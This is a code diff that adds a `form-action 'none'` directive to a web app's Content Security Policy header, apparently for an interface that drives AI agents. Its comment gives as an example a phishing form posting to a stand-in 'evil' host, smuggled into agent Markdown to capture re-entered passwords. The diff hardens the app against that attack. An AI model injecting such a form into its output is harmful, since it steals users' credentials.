@@ -41,6 +41,12 @@ export const NONCE_PLACEHOLDER = "__CSP_NONCE__";
  *   `ws://` on the same host and port.
  * - `base-uri`/`object-src`/`frame-ancestors` at `none`: nothing to rewrite,
  *   nothing to embed, and no clickjacking on a UI that drives agents.
+ * - `form-action 'none'`: no form on any page we serve submits natively — the
+ *   login page and the cockpit both handle `submit` in script and `fetch`. So a
+ *   `<form action="https://evil/…">` smuggled into agent Markdown (a fake
+ *   "session expired, re-enter your password") cannot send what was typed off
+ *   the origin, even if the sanitiser ever lets one through. Not `'self'`: an
+ *   injected form posting to our own routes would be a CSRF from inside.
  */
 export function cspHeader(nonce: string): string {
   return [
@@ -53,6 +59,7 @@ export function cspHeader(nonce: string): string {
     "base-uri 'none'",
     "object-src 'none'",
     "frame-ancestors 'none'",
+    "form-action 'none'",
   ].join("; ");
 }
 
